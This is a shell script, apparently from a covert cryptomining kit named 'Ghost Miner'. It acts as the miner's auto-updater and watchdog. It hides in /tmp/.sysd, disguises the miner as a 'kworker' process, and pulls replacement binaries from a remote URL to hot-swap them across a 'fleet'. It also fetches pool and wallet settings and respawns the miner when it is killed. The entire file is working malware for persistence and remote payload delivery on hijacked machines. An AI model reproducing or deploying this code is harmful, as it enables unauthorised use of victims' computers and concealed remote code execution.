#!/bin/sh
# ============================================================================
# Ghost Miner auto-update + watchdog. Run from the systemd timer (or cron).
#   1) if the published binary hash changed -> hot-swap and restart
#   2) if the miner is dead -> respawn it
# Bumping PAYLOAD_URL/SHA_URL once updates the whole fleet.
# ============================================================================
set -eu

SYSDIR="${SYSDIR:-/tmp/.sysd}"
[ -d "$SYSDIR" ] || exit 0
cd "$SYSDIR"
if [ -r worker.env ]; then . ./worker.env; fi

restart() {
    if command -v systemctl >/dev/null 2>&1; then
        systemctl restart kworker 2>/dev/null || true
    else
        pkill -f "$SYSDIR/kworker" 2>/dev/null || true
        nohup "$SYSDIR/run.sh" >/dev/null 2>&1 &
    fi
}

render_config() {
    curl -fsSL "${CONFIG_URL:?}/config.json" -o config.tmpl 2>/dev/null || return 0
    sed -e "s|__URL__|${POOL:-}|g" \
        -e "s|__USER__|${WALLET:-}|g" \
        -e "s|__PASS__|${RIG_ID:-node}|g" \
        -e "s|__RIGID__|${RIG_ID:-node}|g" \
        -e "s|__TLS__|${TLS:-true}|g" \
        config.tmpl > config.json
}

# --- auto-update -----------------------------------------------------------
if [ -n "${SHA_URL:-}" ]; then
    new=$(curl -fsSL "$SHA_URL" 2>/dev/null | awk '{print $1}' | tr 'A-F' 'a-f' || true)
    cur="none"
    [ -x kworker ] && cur=$(sha256sum kworker | awk '{print $1}' | tr 'A-F' 'a-f')
    if [ -n "${new:-}" ] && [ "$new" != "$cur" ]; then
        if curl -fsSL "$PAYLOAD_URL" -o kworker.new 2>/dev/null; then
            got=$(sha256sum kworker.new | awk '{print $1}' | tr 'A-F' 'a-f')
            if [ "$got" = "$new" ]; then
                chmod 0755 kworker.new
                mv -f kworker.new kworker
                render_config
                restart
                exit 0
            fi
            rm -f kworker.new
        fi
    fi
fi

# --- watchdog: respawn if dead --------------------------------------------
if ! pgrep -f "$SYSDIR/kworker" >/dev/null 2>&1; then
    restart
fi
